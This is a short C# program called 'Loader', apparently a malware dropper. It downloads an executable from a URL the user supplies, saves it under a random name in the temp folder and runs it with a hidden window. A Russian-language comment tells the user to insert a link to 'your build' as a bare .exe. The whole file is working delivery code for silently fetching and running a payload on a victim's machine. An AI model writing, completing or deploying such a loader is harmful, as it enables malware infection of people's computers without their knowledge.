﻿using System;
using System.Net;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;

namespace Loader
{
    class Program
    {
        static void Main(string[] args)
        {
            string url = ""; // Внутри кавычек вставляешь ссылку на свой билд(он обязательно должен быть чисто .exe,не находится в архиве итд)
            string FileLocate = FileName();

            FileName();
            Download(FileLocate, url);
            Runprocess(FileLocate);
        }

        private static void Download(string FileLocate, string url)
        {
            WebClient client = new WebClient();
            client.DownloadFile(new Uri(url), FileLocate + ".exe");
        }

        private static string FileName()
        {
            string Temp = Path.GetTempPath();
            string Ran = Path.GetRandomFileName();
            string FileLocate = Temp + Ran;
            return FileLocate;
        }

        private static void Runprocess(string FileLocate)
        {
            Process process = new Process
            {
                StartInfo =
                {
                    FileName = FileLocate + ".exe", WindowStyle = ProcessWindowStyle.Hidden }
            };
            process.Start();
        }
    }
}
